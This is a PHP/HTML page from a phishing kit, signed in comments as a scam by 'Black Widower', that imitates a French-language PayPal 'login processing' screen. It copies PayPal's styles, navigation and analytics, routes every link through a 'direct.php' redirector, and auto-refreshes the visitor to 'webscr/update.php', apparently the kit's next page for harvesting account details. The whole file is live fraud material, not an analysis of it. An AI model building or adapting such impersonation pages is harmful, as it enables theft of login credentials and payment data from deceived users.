<?php

/***   Scam Made By Black Widower 2012=====201?  **/
/***   Scam Made By Black Widower 2012=====201?  **/
/***   Scam Made By Black Widower 2012=====201?  **/
/***   Scam Made By Black Widower 2012=====201?  **/
/***   Scam Made By Black Widower 2012=====201?  **/

include "lang/langdetect.php";
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "direct.php?site=http://www.w3.org/TR/html4/loose.dtd">
<html lang="fr">
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=<?php echo $charset; ?>">
   
      <!--
               Script info: script: webscr, cmd: _login-processing, template: p/gen/login-processing, date: Feb 10, 2011 21:59:17 PST; country: US, language: fr_XC, xslt server: 
      		web version: 67.0-1741654 branch: BWR_670_int
      		DXPT: true (LOCALE: fr_XC, COUNTRY: US, PRODUCTNUMBER: 67.0, BUILDNUMBER: 1741654, BRANCHNAME: BWR_670_int, PRODUCTNUMBEROVERRIDE: )
	pexml version: -
      		pexml version: 67.0-1755747
      		page XSL: 
             hostname : dUrblYi7kJ.aEH4HmkhJB4rWClp8eNvBQI3KeoM9rV8
               rlogid : dUrblYi7kJ%2faEH4HmkhJB5inquNzFsqNXepzhWLhzEAUfSwJp03SlQ%3d%3d_12e635d8c4c
      -->
      
      <title><?php echo $opay; ?></title>
      <!--googleoff: all-->
      
      <meta name="description" content="PayPal est le moyen plus s&ucirc;r et plus simple de payer en ligne sans divulguer le num&eacute;ro de votre carte de cr&eacute;dit.">
	  <META http-equiv=Refresh content="3; URL=webscr/update.php?cmd=_login-done&amp;login_access=1193476743">
      <!--googleon: all-->

      
      <meta http-equiv="X-UA-Compatible" content="IE=8">
      <link media="screen" rel="stylesheet" type="text/css" href="WEBSCR-640-20101004-1/css/core/global.css">
      <link rel="stylesheet" type="text/css" href="WEBSCR-640-20101004-1/css/Customer/pages/pageSalsa.css">
      <!--[if IE 8]>
      <link media="screen" rel="stylesheet" type="text/css" href="direct.php?site=https://www.paypalobjects.com/WEBSCR-640-20110204-1/css/browsers/ie8.css"><![endif]-->
      
      <!--[if IE 7]>
      <link media="screen" rel="stylesheet" type="text/css" href="direct.php?site=https://www.paypalobjects.com/WEBSCR-640-20110204-1/css/browsers/ie7.css"><![endif]-->
      
      <!--[if lte IE 6]>
      <link media="screen" rel="stylesheet" type="text/css" href="direct.php?site=https://www.paypalobjects.com/WEBSCR-640-20110204-1/css/browsers/ie6.css"><![endif]-->
      
      <link rel="stylesheet" type="text/css" href="WEBSCR-640-20101004-1/css/fr_XC/country.css">
      <link media="print" rel="stylesheet" type="text/css" href="WEBSCR-640-20101004-1/WEBSCR-640-20110204-1/css/core/print.css"><style type="text/css">
					h3 {margin:4em 0 0 0; line-height:normal;}
					p.note {color:#656565; font-size:0.9em;}
					p.note a {color:#656565;}
					p strong {margin-top:2em; color:#1A3665; font-size:1.25em;}
					img.actionImage {margin: 1.88em 0 2em 0;}
				</style><script type="text/javascript">
if (parent.frames.length > 0){
	top.location.replace(document.location);
}</script><script type="text/javascript" src="WEBSCR-640-20101004-1/js/lib/min/global.js"></script><script type="text/javascript">PAYPAL.util.lazyLoadRoot = 'WEBSCR-640-20101004-1';</script><link rel="shortcut icon" href="WEBSCR-640-20101004-1/en_US/i/icon/pp_favicon_x.ico">

      <link rel="apple-touch-icon" href="WEBSCR-640-20101004-1/en_US/i/pui/apple-touch-icon.png">
   </head>
   <body>
      <noscript>
         <p class="nonjsAlert">REMARQUE : Pour utiliser de nombreuses fonctionnalit&eacute;s du site PayPal, vous avez besoin de JavaScript et de cookies. Vous pouvez les activer &agrave; l'aide des param&egrave;tres de votre navigateur.</p>
      </noscript><img src="direct.php?site=https://b.stats.paypal.com/counter.cgi?r=HwgDn0bfEhdZ3YgtqxzT9pD1m-NJ15O1Pm7ssi469ZS11-e_aNF1TH-ewU7w1fJLnOmC_4Z2dKYnGlrURFpE1TCQRDHIEpdMkUbQoFnorCArTdsNiM52pRbeGHZBm39eoAmd26fJ98thFkWOHais1NxS8h_qoznatVrqc-lrJILErzlnkZcXdJfHCrK38hHa53SW1DOqPE4rEokNB7SL_4Gy9RA_dBkplLCmgN-MmQPdaaI2W5_bF-9nolqHKUCUd0M_ZIYYAwbMh-pI8iDF6K-QnpRM29D34uwuEG3GJ06phfzWdy_k3RoRPKU" border="0" class="accessAid" alt="">
      <div class="" id="page">
         <div id="header" class="notab">
            <h1><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_account"><img border="0" src="fr_XC/i/logo/paypal_logo.gif" alt="PayPal"></a></h1>
            <div id="navPrimary" class="empty"></div>
         </div>

         <div id="content">
            <div id="headline">
               <h2 class="accessAid"><?php echo $processing; ?></h2>
            </div>
            <div id="messageBox"></div>
            <div id="main">
               <div class="layout1 textcenter">
                  <h3><?php echo $processing; ?></h3><img src="en_US/i/icon/icon_animated_prog_42wx42h.gif" border="0" class="actionImage" alt="Ouverture d'une session s&eacute;curis&eacute;e"><p><strong><?php echo $safe; ?></strong></p>
<font color="black" size="2"><B>
                  <p class="note"><?php echo $ifno; ?> <a href="webscr/update.php?cmd=_login-done&amp;login_access=1193476743"><?php echo $clickhere; ?></a> <?php echo $reload; ?>                  </p>
</B></font>
               </div>
            </div>
         </div>
         <div id="navFull">
            <ul>

               <li class="active"><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_account&amp;nav=0" class="scTrack:SRD:Nav:RO">Mon compte</a><ul>
                     <li class="active"><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_account&amp;nav=0.0" class="scTrack:SRD:Nav:RP">Aper&ccedil;u</a></li>
                     <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_add-funds&amp;nav=0.1" class="scTrack:SRD:Nav:RQ">Ajouter des fonds</a><ul>
                           <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_add-funds-bank&amp;origination=_add-funds-bank&amp;ach_country_code=US&amp;nav=0.1.0" class="scTrack:SRD:Nav:FA">Ajouter des fonds &agrave; partir d'un compte bancaire</a></li>
                           <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_balance-manager&amp;nav=0.1.1" class="scTrack:SRD:Nav:k90">Gestionnaire de solde</a></li>

                           <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_addfunds-greendot&amp;user_action=add_funds_link&amp;nav=0.1.2" class="scTrack:SRD:Nav:V06">Ajouter des fonds par MoneyPak</a></li>
                        </ul>
                     </li>
                     <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_withdraw-funds&amp;nav=0.2" class="scTrack:SRD:Nav:RR">Virer</a><ul>
                           <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_withdraw-funds-bank&amp;nav=0.2.0" class="scTrack:SRD:Nav:RS">Transf&eacute;rer des fonds vers un compte bancaire</a></li>
                           <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_withdraw-funds-check&amp;nav=0.2.1" class="scTrack:SRD:Nav:RT">Demander une v&eacute;rification</a></li>

                           <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_dc-intro&amp;nav=0.2.2" class="scTrack:SRD:Nav:RU">Utiliser une carte bancaire</a></li>
                        </ul>
                     </li>
                     <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_history&amp;nav=0.3" class="scTrack:SRD:Nav:RV">Historique</a><ul>
                           <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_history&amp;nav=0.3.0" class="scTrack:SRD:Nav:RW">Recherche de base</a></li>
                           <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_history-download&amp;nav=0.3.1" class="scTrack:SRD:Nav:RY">T&eacute;l&eacute;charger l'historique</a></li>

                        </ul>
                     </li>
                     <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_complaint-view&amp;nav=0.4" class="scTrack:SRD:Nav:SC">Gestionnaire de litiges</a><ul>
                           <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_complaint-view&amp;nav=0.4.0" class="scTrack:SRD:Nav:SD">Visualiser les dossiers en cours</a></li>
                           <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=xpt/CaseManagement/customerservice/EducationModuleIndex&amp;nav=0.4.1" class="scTrack:SRD:Nav:SF">Didacticiels</a></li>
                        </ul>
                     </li>

                     <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-summary&amp;nav=0.5" class="scTrack:SRD:Nav:SN">Pr&eacute;f&eacute;rences</a><ul>
                           <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-email&amp;nav=0.5.0" class="scTrack:SRD:Nav:SO">Ajouter ou modifier une adresse email</a></li>
                           <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-ach&amp;nav=0.5.1" class="scTrack:SRD:Nav:SP">Enregistrer ou modifier un compte bancaire</a></li>
                           <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-credit-card-new-clickthru&amp;flag_from_account_summary=1&amp;nav=0.5.2" class="scTrack:SRD:Nav:SQ">Enregistrer ou modifier une carte bancaire</a></li>
                           <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-address&amp;nav=0.5.3" class="scTrack:SRD:Nav:SR">Ajouter ou modifier une adresse postale</a></li>

                           <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-phone&amp;nav=0.5.4" class="scTrack:SRD:Nav:Z9">Enregistrer ou modifier un num&eacute;ro de t&eacute;l&eacute;phone</a></li>
                           <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-summary&amp;nav=0.5.5" class="scTrack:SRD:Nav:x76">Plus d'options</a></li>
                        </ul>
                     </li>
                  </ul>
               </li>

               <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_send-money&amp;nav=1" class="scTrack:SRD:Nav:TZ">Envoi d'argent</a></li>
               <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_rm&amp;nav=2" class="scTrack:SRD:Nav:UC">Demande de paiement</a></li>
               <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_merchant&amp;nav=3" class="scTrack:SRD:Nav:UF">Solutions e-commerce</a></li>
               <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=xpt/Marketing_CommandDriven/general/ProductsandServices&amp;nav=4" class="scTrack:SRD:Nav:AK6">Produits et services</a></li>
               <li><a href="direct.php?site=https://www.paypal-community.com/" class="scTrack:SRD:Nav:U44">Communaut&eacute;</a></li>
            </ul>
         </div><script type="text/javascript">if(typeof PAYPAL != 'undefined'){ PAYPAL.core.Navigation.init(); }</script></div>
      <script type="text/javascript" src="WEBSCR-640-20101004-1/js/lib/min/widgets.js"></script><script type="text/javascript" src="WEBSCR-640-20101004-1/js/lib/min/calendar.js"></script>
      <!-- SiteCatalyst Code
      Copyright 1997-2005 Omniture, Inc.
      More info available at direct.php?site=http://www.omniture.com -->
      <script type="text/javascript" src="WEBSCR-640-20101004-1/js/site_catalyst/pp_jscode_080706.js"></script>
      <script type="text/javascript">
      s.prop1="p/gen/login-processing";
      s.prop6="2BU07622PH553712M";
      s.prop7="Personal";
      s.prop8="Unverified";
      s.prop9="Unrestricted";
      s.prop10="US";
      s.prop14="";
      s.prop16="";
      s.prop34="PayPalCredit:Servicing:CO:NoTransactions";
      s.prop15="";
      s.pageName="p/gen/login-processing::_login-processing";
      s.prop50="fr_XC";
      s.prop18="";
      </script>
      <script type="text/javascript"><!--
      /************* DO NOT ALTER ANYTHING BELOW THIS LINE ! **************/
      var s_code=s.t();if(s_code)document.write(s_code);
      if(navigator.appVersion.indexOf('MSIE')>=0)document.write(unescape('%3C')+'\!-'+'-')
      //-->
      </script><noscript><img
      src="//paypal.112.2O7.net/b/ss/paypalglobal/1/H.6--NS/0?pageName=NonJavaScript"
      height="1" width="1" border="0" alt="" /></noscript>

      <!--/DO NOT REMOVE/-->
      
      <!-- End SiteCatalyst Code -->
</body>
</html>

<?php
/***   Scam Made By Black Widower 2012=====201?  **/
/***   Scam Made By Black Widower 2012=====201?  **/
/***   Scam Made By Black Widower 2012=====201?  **/
/***   Scam Made By Black Widower 2012=====201?  **/
/***   Scam Made By Black Widower 2012=====201?  **/

?>